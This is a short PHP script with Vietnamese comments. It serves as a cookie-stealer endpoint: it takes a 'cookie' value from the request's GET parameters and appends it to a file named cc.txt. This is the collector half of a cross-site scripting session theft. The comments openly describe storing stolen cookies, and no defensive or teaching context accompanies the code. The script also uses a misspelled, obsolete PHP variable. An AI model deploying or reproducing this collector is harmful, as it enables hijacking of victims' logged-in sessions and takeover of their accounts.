<?php
$cookie=$HTTP_GET_VAR["cookie"];  //Lấy cookie từ địa chỉ hiện tại và lưu trữ cookie trong biến $cookie
$steal=fopen("cc.txt","a");               //Mở cookiefile để đính kèm các cookie lấy được
fwrite($steal,$cookie."\n");                //Viết lại những cookie lấy được lưu trong file $steal
fclose($steal);                                 //Đóng lại cookiefiles.
?>